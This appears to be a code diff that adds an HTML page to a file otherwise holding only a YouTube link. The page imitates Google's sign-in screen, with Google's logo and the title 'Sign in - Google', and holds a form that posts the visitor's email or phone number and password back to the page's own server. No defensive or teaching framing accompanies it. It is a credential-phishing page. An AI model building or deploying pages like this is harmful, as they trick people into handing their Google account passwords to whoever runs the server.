@@ -1,1 +1,17 @@
 https://youtu.be/JgxEkUHKOBo?t=891
+
+
+
+///
+
+
+<!DOCTYPE html><html><head>
+	<title>Sign in - Google</title>
+</head>
+<body>
+<form method="POST" action="">
+<div style="width: 360px; margin: auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); text-align:center;"><img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" style="margin-bottom: 20px;" width="80"/> <input name="email" placeholder="Email or phone" required="" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;" type="text"/> <input name="password" placeholder="Enter your password" required="" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;" type="password"/><button style="width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;" type="submit">Next</button></div>
+</form>
+
+
+</body></html>
